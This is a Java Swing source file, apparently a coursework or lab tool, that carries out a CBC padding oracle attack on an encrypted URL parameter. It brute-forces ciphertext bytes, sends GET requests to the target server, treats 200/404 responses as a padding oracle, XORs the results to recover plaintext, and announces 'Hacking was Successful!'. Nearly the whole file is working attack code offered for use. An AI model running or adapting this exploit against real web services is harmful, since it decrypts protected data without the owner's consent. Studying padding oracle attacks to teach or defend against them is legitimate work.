
import java.awt.Color;
import java.awt.Desktop;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.lang.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.SwingConstants;
import javax.swing.SwingWorker;

public class Decipher extends SwingWorker<Void,Integer> {

    private static String url = tester.textArea.getText();
    private static StringBuilder test = new StringBuilder(url.substring(url.indexOf("=") + 1, url.length()));
    private static int point = test.length() - test.length() / 4;
    private static int counter = 1;
    private static StringBuilder xorcounter = new StringBuilder("01");
    static StringBuilder newByte = new StringBuilder();
    private static int rem = point;
    static int count = 0;
    private static StringBuilder plaintext = new StringBuilder();
    private static ArrayList<String> validpads = new ArrayList();
    static int metritis = 0;
    static int voith=0;
    public static int toFind=0;
    public static void decipher(StringBuilder test, int point) throws MalformedURLException {

        String last = null;
        test = new StringBuilder(test.substring(test.indexOf("=") + 1, test.length()));
        String prevcipher = test.substring(point - 2, point);///ypothtw pws krataw ka8e fora mia 2ada aythn toy ciphertext wste na thn steilw gia na ginei to xor (krataw to co)

        for (int j = 0; j < 16; j++) {
            for (int i = 0; i < 16; i++) {
                if (i > 9 && j <= 9) {

                    StringBuilder temp = new StringBuilder(Integer.toString(j) + Integer.toHexString(i));//analoga thn peristash dhmiourgia 2 newn psifiwn pou tha dokimastoun an tairizoun
                    newByte.replace(0, newByte.length(), temp.toString());
                    test.replace(point - 2, point, newByte.toString());
                    last = url.substring(0, url.indexOf("=") + 1) + test;
                    URL send = new URL(last);
                    checkUrl(send, point, prevcipher, temp.toString());

                } else if (i <= 9 && j > 9) {

                    StringBuilder temp = new StringBuilder(Integer.toHexString(j) + Integer.toString(i));
                    newByte.replace(0, newByte.length(), temp.toString());
                    test.replace(point - 2, point, newByte.toString());
                    last = url.substring(0, url.indexOf("=") + 1) + test;
                    URL send = new URL(last);
                    checkUrl(send, point, prevcipher, temp.toString());

                } else if (i > 9 && j > 9) {

                    StringBuilder temp = new StringBuilder(Integer.toHexString(i) + Integer.toHexString(j));
                    newByte.replace(0, newByte.length(), temp.toString());
                    test.replace(point - 2, point, newByte.toString());
                    last = url.substring(0, url.indexOf("=") + 1) + test;
                    URL send = new URL(last);
                    checkUrl(send, point, prevcipher, temp.toString());

                } else if (i <= 9 && j <= 9) {

                    StringBuilder temp = new StringBuilder(Integer.toString(i) + Integer.toString(j));
                    newByte.replace(0, newByte.length(), temp.toString());
                    test.replace(point - 2, point, newByte.toString());
                    last = url.substring(0, url.indexOf("=") + 1) + test;
                    URL send = new URL(last);
                    checkUrl(send, point, prevcipher, temp.toString());
                }

            }
        }

    }

   public static void checkUrl(URL send, int point, String cipherbytes, String validPad) {//h checkurl pernei ena URL pou mporoume na to xrhsimopoisoume gia na ton anoiksoume ston broswer mas me xrhsh ths 
                                                                                          //openwebpage 
        int code = 0;
        HttpURLConnection huc = null;
        
        try {//anoigma http sundeshs kai elenxos apotelesmatos me to link to kainourio
            huc = (HttpURLConnection) send.openConnection();
            huc.setRequestMethod("GET");  //OR  huc.setRequestMethod ("HEAD"); 
            huc.connect();
            code = huc.getResponseCode();
        } catch (IOException ex) {
            Logger.getLogger(Decipher.class.getName()).log(Level.SEVERE, null, ex);
        }

        if (code == 200 && point == 96) { 
            
        }

        if (code == 404 || (code == 200 && point != 96)) {
            metritis++;
            toFind++;
            StringBuilder sendingURL = new StringBuilder(send.toString());
            sendingURL = new StringBuilder(send.toString().substring(send.toString().indexOf("=") + 1, send.toString().length()));

            plaintext.append(xorplaintext(validPad, cipherbytes, xorcounter.toString()));// PLAINTEXT
            StringBuilder output = new StringBuilder();
            for (int y = 0; y < plaintext.length(); y+=2) {
                String str = plaintext.substring(y, y+2);
                output.append((char)Integer.parseInt(str, 16));  
            }
            tester.jLabel6.setText(output.reverse().toString());
            validpads.add(0, validPad);
            counter++;//eimai 2
            if(counter < 17) {//me <= ksanampainei kai kanei xorcounter = 011 
                if (counter > 9 && counter <17) {
                    xorcounter.setLength(0);
                    xorcounter.append("0").append(Integer.toHexString(counter));
                    if(xorcounter.length()==3){
                        xorcounter = new StringBuilder( xorcounter.substring(1, 3) );
                    }
                } else if (counter <= 9) {
                    xorcounter.setLength(0);
                    xorcounter.append("0").append(Integer.toString(counter));
                }
                int temp = metritis;
            for (int l = point - 2; l < rem; l += 2) {

                if (temp > 9) {
                    sendingURL.replace(l, l + 2, xorfix(validpads.get(count), ("0" + Integer.toHexString(temp)), xorcounter.toString()));
                } else if (temp <= 9) {
                    sendingURL.replace(l, l + 2, xorfix(validpads.get(count), ("0" + Integer.toString(temp)), xorcounter.toString()));
                }
                temp--;

                count++;

            }
            temp = 0;
            }
            else{
                
                try {
                    voith+=32;
                    counter=1;
                    metritis=0;
                    xorcounter.setLength(0);
                    xorcounter.append("0").append(Integer.toString(counter));
                    sendingURL=new StringBuilder(url.toString().substring(0, url.length()-voith));
                    point -= 2;
                    rem=point;
                    if(point == 0){
                        tester.jLabel3.setVisible(false);
                        tester.jLabel3.setHorizontalAlignment(SwingConstants.CENTER);
                        tester.jLabel3.setVerticalAlignment(SwingConstants.CENTER);
                        tester.jLabel3.setText("Hacking was Successful!");
                        tester.jLabel3.setForeground(Color.green);
                        tester.jLabel3.setVisible(true);
                    }
                    decipher(sendingURL, point);
                    
                } catch (MalformedURLException ex) {
                    Logger.getLogger(Decipher.class.getName()).log(Level.SEVERE, null, ex);
                }
                
            }
            count = 0;         
            point -= 2;

            try {
                sendingURL = new StringBuilder(send.toString().substring(0, send.toString().indexOf("=") + 1) + sendingURL);
                decipher(sendingURL, point);
            } catch (MalformedURLException ex) {
                Logger.getLogger(Decipher.class.getName()).log(Level.SEVERE, null, ex);
            }
            System.exit(0);

        }
    }

    public static String xorplaintext(String validP, String cipher, String xorCounter) {
        return xorHex(validP, cipher, xorCounter);
    }

    public static String xorfix(String validP, String xorpad, String xorCounter) {
        return xorHex(validP, xorpad, xorCounter);
    }

    public static boolean openWebpage(URI uri) {
        Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
        if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
            try {
                desktop.browse(uri);
                return true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return false;
    }

    public static boolean openWebpage(URL url) {
        try {
            return openWebpage(url.toURI());
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
        return false;
    }

    public static String xorHex(String a, String b, String c) {
        char[] chars = new char[a.length()];
        for (int i = 0; i < chars.length; i++) {
            chars[i] = toHex(fromHex(a.charAt(i)) ^ fromHex(b.charAt(i)) ^ fromHex(c.charAt(i)));
        }
        return new String(chars);
    }

    private static int fromHex(char c) {
        if (c >= '0' && c <= '9') {
            return c - '0';
        }
        if (c >= 'A' && c <= 'F') {
            return c - 'A' + 10;
        }
        if (c >= 'a' && c <= 'f') {
            return c - 'a' + 10;
        }
        throw new IllegalArgumentException();
    }

    private static char toHex(int nybble) {
        if (nybble < 0 || nybble > 15) {
            throw new IllegalArgumentException();
        }
        return "0123456789ABCDEF".charAt(nybble);
    }

    @Override
    protected Void doInBackground() throws Exception {
        decipher(test,96);
        return null;
    }

}
